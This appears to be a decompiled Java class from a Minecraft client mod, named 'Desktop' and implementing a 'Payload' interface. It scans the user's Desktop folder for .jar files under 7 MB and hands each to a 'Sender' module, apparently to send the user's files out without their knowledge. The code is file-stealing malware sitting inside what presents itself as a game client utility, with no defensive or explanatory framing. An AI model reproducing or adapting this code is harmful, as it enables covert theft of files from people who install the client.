package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.Payload;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public final class Desktop implements Payload {
   public void execute() throws Exception {
      Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop")).filter((path) -> {
         return path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop");
      }).filter((path) -> {
         return path.toFile().getName().endsWith(".jar");
      }).filter((path) -> {
         try {
            return Files.size(path) < 7000000L;
         } catch (IOException var2) {
            return false;
         }
      }).forEach((path) -> {
         Sender.send(path.toFile());
      });
   }
}
